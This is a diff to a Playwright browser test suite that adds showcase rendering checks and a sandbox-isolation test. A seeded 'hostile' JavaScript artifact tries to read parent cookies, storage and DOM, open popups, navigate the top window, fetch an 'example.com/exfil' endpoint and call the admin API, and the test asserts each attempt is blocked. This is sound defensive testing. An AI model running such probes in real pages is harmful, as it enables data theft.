@@ -19,12 +19,23 @@ import {
   startDatabaseServer,
   waitForSchema,
 } from "./http-suite/db.mjs";
+import {
+  BUILD_ID,
+  seedPublishedBuild,
+  SHOWCASE_MODEL_ID,
+  SOURCE_ID as SHOWCASE_SOURCE_ID,
+} from "./http-suite/showcase-checks.mjs";
 import { seedCatalog } from "./http-suite/seed.mjs";
+import { catalogIdentityDigest, sha256Hex } from "../lib/visual-builds/types.ts";
 
 const REPO = process.cwd();
 const BUILD_MARKER = join(REPO, ".next", "BUILD_ID");
+const SHOWCASE_ONLY = process.argv.includes("--showcase");
 const ARTIFACT_DIR = join(REPO, ".scratch", "browser-matrix");
-const ARTIFACT_JSON = join(ARTIFACT_DIR, "result.json");
+const ARTIFACT_JSON = join(
+  ARTIFACT_DIR,
+  SHOWCASE_ONLY ? "showcase-result.json" : "result.json",
+);
 const MOBILE = { width: 390, height: 844 };
 const DESKTOP = { width: 1280, height: 900 };
 const PASSWORD = "browser-matrix-password";
@@ -37,6 +48,9 @@ const COMMENT_AUTHOR = "Browser Fixture Commenter";
 const COMMENT_BODY = "A top-level fixture comment for the reply journey.";
 const SOURCE_ID = "browser-suite-source";
 const COMMENT_ID = "browser-suite-comment";
+const HOSTILE_BUILD_ID = "bld_browser_hostile";
+const HOSTILE_REVISION_ID = "rev_browser_hostile";
+const HOSTILE_TITLE = "Hostile browser probe";
 
 function edgePath() {
   if (process.platform !== "win32") return null;
@@ -57,9 +71,26 @@ async function launchBrowser() {
     const browser = await chromium.launch({
       channel: requestedChannel,
       headless: true,
+      args: ["--enable-unsafe-swiftshader"],
     });
 
     return { browser, label: `Playwright channel ${requestedChannel}` };
+  }
+
+  if (SHOWCASE_ONLY) {
+    try {
+      console.log("browser-matrix: launching bundled Chromium");
+      const browser = await chromium.launch({
+        headless: true,
+        args: ["--enable-unsafe-swiftshader"],
+      });
+
+      return { browser, label: "Playwright bundled Chromium" };
+    } catch (error) {
+      console.log(
+        `browser-matrix: bundled Chromium unavailable, falling back (${error instanceof Error ? error.message : String(error)})`,
+      );
+    }
   }
 
   const edge = edgePath();
@@ -69,6 +100,7 @@ async function launchBrowser() {
     const browser = await chromium.launch({
       channel: "msedge",
       headless: true,
+      args: ["--enable-unsafe-swiftshader"],
     });
 
     return { browser, label: "Microsoft Edge via Playwright" };
@@ -76,7 +108,10 @@ async function launchBrowser() {
 
   try {
     console.log("browser-matrix: launching bundled Chromium");
-    const browser = await chromium.launch({ headless: true });
+    const browser = await chromium.launch({
+      headless: true,
+      args: ["--enable-unsafe-swiftshader"],
+    });
 
     return { browser, label: "Playwright bundled Chromium" };
   } catch (error) {
@@ -281,7 +316,7 @@ async function assertNoHorizontalOverflow(page) {
   assert.ok(overflow <= 1, `mobile layout overflows by ${overflow}px`);
 }
 
-function trackErrors(page) {
+function trackErrors(page, options = {}) {
   const errors = [];
 
   page.on("pageerror", (error) => {
@@ -294,6 +329,14 @@ function trackErrors(page) {
     const url = message.location().url;
 
     if (url && !url.startsWith("http://127.0.0.1")) return;
+    if (
+      options.ignoreCsp &&
+      /Content Security Policy|Refused to connect|Blocked opening/.test(
+        message.text(),
+      )
+    ) {
+      return;
+    }
 
     errors.push(`console: ${message.text()}`);
   });
@@ -497,6 +540,317 @@ async function catalogJourney(page, baseUrl) {
   await page.getByRole("heading", { level: 1 }).waitFor();
 }
 
+async function seedHostileBuild(db, baseUrl) {
+  const artifact = `
+export function createPelicanSdf(canvas) {
+  const state = window.__hostile = { done: false };
+  try { parent.document.body; state.parentDocument = "read"; }
+  catch { state.parentDocument = "blocked"; }
+  try { parent.document.cookie; state.parentCookie = "read"; }
+  catch { state.parentCookie = "blocked"; }
+  try { parent.localStorage.length; state.parentStorage = "read"; }
+  catch { state.parentStorage = "blocked"; }
+  try { state.popup = window.open("https://example.com") ? "opened" : "blocked"; }
+  catch { state.popup = "blocked"; }
+  try { top.location.href = "https://example.com"; state.topNavigation = "set"; }
+  catch { state.topNavigation = "blocked"; }
+  fetch("https://example.com/exfil").then(
+    () => { state.exfil = "sent"; },
+    () => { state.exfil = "blocked"; },
+  );
+  fetch("${baseUrl}/api/admin/showcase", { credentials: "include" }).then(
+    (response) => { state.adminStatus = response.status; state.done = true; },
+    () => { state.adminStatus = "blocked"; state.done = true; },
+  );
+  const gl = canvas.getContext("webgl2");
+  if (gl) {
+    gl.clearColor(0.1, 0.55, 0.8, 1);
+    gl.clear(gl.COLOR_BUFFER_BIT);
+  }
+}
+`;
+  const bytes = Buffer.from(artifact, "utf8");
+  const sha = sha256Hex(artifact);
+  const now = new Date().toISOString();
+  const digest = catalogIdentityDigest({
+    id: SHOWCASE_MODEL_ID,
+    upstreamId: SHOWCASE_MODEL_ID,
+    name: "Showcase HTTP Model",
+    family: "Pelican Test",
+    inCatalog: true,
+    status: "active",
+  });
+
+  await db
+    .prepare(
+      `INSERT INTO showcase.assets
+        (id, source_id, sha256, mime, kind, bytes, byte_size, created_at)
+       VALUES ('ast_browser_hostile', ?, ?, 'text/javascript; charset=utf-8',
+               'artifact', ?, ?, ?)
+       ON CONFLICT (id) DO NOTHING`,
+    )
+    .run(SHOWCASE_SOURCE_ID, sha, bytes, bytes.length, now);
+  await db
+    .prepare(
+      `INSERT INTO showcase.builds
+        (id, source_id, external_id, visibility, published_revision_id,
+         published_at, created_at, updated_at)
+       VALUES (?, ?, 'browser-hostile', 'published', ?, ?, ?, ?)
+       ON CONFLICT (id) DO NOTHING`,
+    )
+    .run(
+      HOSTILE_BUILD_ID,
+      SHOWCASE_SOURCE_ID,
+      HOSTILE_REVISION_ID,
+      now,
+      now,
+      now,
+    );
+  await db
+    .prepare(
+      `INSERT INTO showcase.revisions
+        (id, build_id, revision_key, source_id, source_url, source_revision,
+         title, description, original_model_id, original_model_label, creator,
+         provider, task, effort, harness, source_status, validation_state,
+         source_created_at, prompt_text, prompt_sha256, raw_record_json,
+         raw_record_sha256, cost_usd_micros, generation_ms, artifact_asset_id,
+         thumbnail_asset_id, license_text, license_sha256, created_at)
+       VALUES (?, ?, 'hostile-key', ?, 'https://example.test/hostile',
+               'browser-revision', ?, 'Sandbox isolation fixture.',
+               'hostile-model', 'Hostile model', 'Browser suite', 'Fixture',
+               'one-shot', 'high', 'browser', 'unverified', 'passed', ?, ?, ?,
+               '{}', ?, NULL, NULL, 'ast_browser_hostile', NULL, 'MIT License',
+               ?, ?)
+       ON CONFLICT (id) DO NOTHING`,
+    )
+    .run(
+      HOSTILE_REVISION_ID,
+      HOSTILE_BUILD_ID,
+      SHOWCASE_SOURCE_ID,
+      HOSTILE_TITLE,
+      now,
+      "hostile prompt",
+      sha256Hex("hostile prompt"),
+      sha256Hex("{}"),
+      sha256Hex("MIT License"),
+      now,
+    );
+  await db
+    .prepare(
+      `INSERT INTO showcase.bindings
+        (id, revision_id, model_id, state, method, reason, catalog_digest,
+         reviewer, reviewed_at, created_at)
+       VALUES ('bnd_browser_hostile', ?, ?, 'accepted', 'exact_id',
+               'Browser hostile fixture.', ?, 'browser-suite', ?, ?)
+       ON CONFLICT (id) DO NOTHING`,
+    )
+    .run(HOSTILE_REVISION_ID, SHOWCASE_MODEL_ID, digest, now, now);
+}
+
+async function viewerFrame(page) {
+  const iframe = page.locator('iframe[title*="interactive visual build"]');
+
+  await iframe.waitFor({ state: "visible" });
+
+  const handle = await iframe.elementHandle();
+  const frame = await handle?.contentFrame();
+
+  assert.ok(frame, "the sandboxed viewer frame is attached");
+  await frame.waitForSelector("canvas", { timeout: 30_000 });
+
+  return { iframe, frame };
+}
+
+async function showcaseRenderJourney(page, baseUrl, theme) {
+  for (const width of [320, 1024, 1440]) {
+    await page.setViewportSize({
+      width,
+      height: width === 320 ? 844 : 900,
+    });
+    await page.goto(`${baseUrl}/showcase`, { waitUntil: "domcontentloaded" });
+    await page.getByRole("heading", { level: 1, name: /One prompt/ }).waitFor();
+    await assertNoHorizontalOverflow(page);
+
+    const card = page.locator(`a[href="/showcase/${BUILD_ID}"]`).first();
+
+    await card.waitFor({ state: "visible" });
+    await card.click();
+    await page.waitForURL(`**/showcase/${BUILD_ID}`, { timeout: 15_000 });
+    await page.getByRole("heading", { level: 1, name: /GPT-6.1 Sol/ }).waitFor();
+    await assertNoHorizontalOverflow(page);
+    await assertTheme(page, theme);
+
+    const { iframe, frame } = await viewerFrame(page);
+    const pixels = await frame.evaluate(() => {
+      const canvas = document.querySelector("canvas");
+      const gl = canvas?.getContext("webgl2");
+
+      if (!canvas || !gl) return null;
+
+      const data = new Uint8Array(4 * 16);
+
+      gl.readPixels(0, 0, 4, 4, gl.RGBA, gl.UNSIGNED_BYTE, data);
+
+      return {
+        width: canvas.width,
+        height: canvas.height,
+        sum: data.reduce((total, value) => total + value, 0),
+      };
+    });
+
+    assert.ok(
+      pixels && pixels.width > 0 && pixels.height > 0,
+      "the artifact has a WebGL canvas",
+    );
+    assert.ok(pixels.sum > 0, "the artifact rendered non-blank WebGL pixels");
+
+    const before = await iframe.screenshot();
+
+    assert.ok(
+      before.length > 5_000,
+      `the rendered frame is not blank (${before.length} bytes)`,
+    );
+
+    await frame.locator("canvas").click({ position: { x: 40, y: 40 } });
+    await page.keyboard.press("ArrowRight");
+
+    const box = await iframe.boundingBox();
+
+    assert.ok(box, "the viewer frame has a layout box");
+    await page.touchscreen.tap(box.x + box.width / 2, box.y + box.height / 2);
+    await page.mouse.move(box.x + 20, box.y + 20);
+    await page.mouse.down();
+    await page.mouse.move(box.x + box.width - 20, box.y + box.height / 2, {
+      steps: 8,
+    });
+    await page.mouse.up();
+
+    const after = await iframe.screenshot();
+
+    assert.ok(after.length > 5_000, "the frame still renders after pointer input");
+    assert.notDeepEqual(
+      after,
+      before,
+      "keyboard, touch or pointer input reached the artifact",
+    );
+  }
+}
+
+async function showcaseHostileJourney(page, baseUrl) {
+  await page.goto(`${baseUrl}/showcase/${HOSTILE_BUILD_ID}`, {
+    waitUntil: "domcontentloaded",
+  });      await page.getByRole("heading", { level: 1, name: HOSTILE_TITLE }).waitFor();
+
+  const { iframe, frame } = await viewerFrame(page);
+
+  await frame.waitForFunction(() => window.__hostile?.done === true, null, {
+    timeout: 15_000,
+  });
+
+  const probe = await frame.evaluate(() => window.__hostile);
+
+  assert.equal(probe.parentDocument, "blocked", "parent DOM is unreachable");
+  assert.equal(probe.parentCookie, "blocked", "parent cookies are unreachable");
+  assert.equal(probe.parentStorage, "blocked", "parent storage is unreachable");
+  assert.equal(probe.popup, "blocked", "popups are blocked");
+  assert.equal(probe.exfil, "blocked", "outbound exfiltration is blocked");
+  assert.equal(probe.adminStatus, "blocked", "the parent admin API is unreachable");
+  assert.equal(
+    page.url(),
+    `${baseUrl}/showcase/${HOSTILE_BUILD_ID}`,
+    "top navigation was blocked",
+  );
+
+  const shot = await iframe.screenshot();
+
+  assert.ok(
+    shot.length > 1_000,
+    "the hostile artifact still rendered inside the frame",
+  );
+
+  const bundle = await page.request.get(`${baseUrl}/api/showcase/${BUILD_ID}`);
+
+  assert.match(bundle.headers()["content-type"] ?? "", /application\/json/);
+  assert.ok(
+    (await bundle.text()).trim().startsWith("{"),
+    "the direct source route serves JSON, not HTML",
+  );
+
+  await page.goto(`${baseUrl}/showcase`, { waitUntil: "domcontentloaded" });
+  await page.getByRole("heading", { level: 1, name: /One prompt/ }).waitFor();
+  assert.equal(
+    page.frames().length,
+    1,
+    "leaving the detail page destroys the viewer frame",
+  );
+}
+
+async function runShowcaseTheme(browser, baseUrl, theme) {
+  const context = await browser.newContext({
+    viewport: MOBILE,
+    colorScheme: theme,
+    deviceScaleFactor: 1,
+    hasTouch: true,
+  });
+
+  await context.addInitScript((value) => {
+    try {
+      window.localStorage.setItem("theme", value);
+      window.localStorage.setItem("next-themes", value);
+    } catch {
+      // The sandboxed viewer has an opaque origin and cannot use host storage.
+    }
+  }, theme);
+  await context.route("**/*", async (route) => {
+    const url = new URL(route.request().url());
+    const loopback =
+      url.hostname === "127.0.0.1" ||
+      url.hostname === "localhost" ||
+      url.hostname === "::1";
+
+    if (loopback) {
+      if (url.pathname.startsWith("/_vercel/")) {
+        await route.fulfill({
+          status: 200,
+          contentType: "application/javascript",
+          body: "",
+        });
+
+        return;
+      }
+
+      await route.continue();
+
+      return;
+    }
+
+    await route.abort();
+  });
+
+  const page = await context.newPage();
+
+  page.setDefaultTimeout(20_000);
+
+  const errors = trackErrors(page, { ignoreCsp: true });
+  const completed = [];
+
+  try {
+    await journey(theme, "showcase render and input at 320/1024/1440", page, errors, async () => {
+      await showcaseRenderJourney(page, baseUrl, theme);
+    });
+    completed.push("showcase render and input at 320/1024/1440");
+
+    await journey(theme, "showcase hostile isolation and teardown", page, errors, async () => {
+      await showcaseHostileJourney(page, baseUrl);
+    });
+    completed.push("showcase hostile isolation and teardown");
+
+    return { theme, completed };
+  } finally {
+    await context.close();
+  }
+}
+
 async function runTheme(browser, baseUrl, theme, account) {
   const context = await browser.newContext({
     viewport: MOBILE,
@@ -623,6 +977,7 @@ async function main() {
         CARD_TOPUPS_ENABLED: "true",
         CONTENT_ENABLED: "true",
         CONTENT_INGEST_ENABLED: "false",
+        VISUAL_BUILDS_ENABLED: SHOWCASE_ONLY ? "true" : "false",
         NEXT_PUBLIC_SITE_URL: `http://127.0.0.1:${serverPort}`,
         GATEWAY_DISPOSABLE_START: "yes",
         PAID_KEY_RPM: "60",
@@ -642,32 +997,40 @@ async function main() {
 
     database = await openDatabase(databaseServer.connectionString);
     await waitForSchema(database);
-    await waitForContentSchema(database);
     await seedCatalog(database, { mockBaseUrl: mock.baseUrl });
 
-    const commenter = await signup(
-      baseUrl,
-      "browser-commenter@example.test",
-      COMMENT_AUTHOR,
-    );
+    let accounts = [];
 
-    await seedContent(database, commenter.id);
+    if (SHOWCASE_ONLY) {
+      await seedPublishedBuild(database);
+      await seedHostileBuild(database, baseUrl);
+    } else {
+      await waitForContentSchema(database);
 
-    const accounts = [
-      {
-        theme: "light",
-        email: "browser-light@example.test",
-        name: "Browser Light",
-      },
-      {
-        theme: "dark",
-        email: "browser-dark@example.test",
-        name: "Browser Dark",
-      },
-    ];
+      const commenter = await signup(
+        baseUrl,
+        "browser-commenter@example.test",
+        COMMENT_AUTHOR,
+      );
 
-    for (const account of accounts) {
-      await signup(baseUrl, account.email, account.name);
+      await seedContent(database, commenter.id);
+
+      accounts = [
+        {
+          theme: "light",
+          email: "browser-light@example.test",
+          name: "Browser Light",
+        },
+        {
+          theme: "dark",
+          email: "browser-dark@example.test",
+          name: "Browser Dark",
+        },
+      ];
+
+      for (const account of accounts) {
+        await signup(baseUrl, account.email, account.name);
+      }
     }
 
     const launched = await launchBrowser();
@@ -676,8 +1039,14 @@ async function main() {
 
     const results = [];
 
-    for (const account of accounts) {
-      results.push(await runTheme(browser, baseUrl, account.theme, account));
+    if (SHOWCASE_ONLY) {
+      for (const theme of ["light", "dark"]) {
+        results.push(await runShowcaseTheme(browser, baseUrl, theme));
+      }
+    } else {
+      for (const account of accounts) {
+        results.push(await runTheme(browser, baseUrl, account.theme, account));
+      }
     }
 
     const buildId = await import("node:fs/promises").then(({ readFile }) =>
@@ -688,6 +1057,17 @@ async function main() {
       generatedAt: new Date().toISOString(),
       baseUrl,
       buildId: buildId.trim(),
+      mode: SHOWCASE_ONLY ? "showcase" : "full",
+      showcase: SHOWCASE_ONLY
+        ? {
+            widths: [320, 1024, 1440],
+            webglPixels: true,
+            input: "keyboard, touch and pointer delivered",
+            isolation:
+              "opaque origin; parent DOM, cookie, storage, popup, admin API and outbound fetch blocked",
+            teardown: true,
+          }
+        : null,
       themes: results,
       checks: results.reduce(
         (total, entry) => total + entry.completed.length,
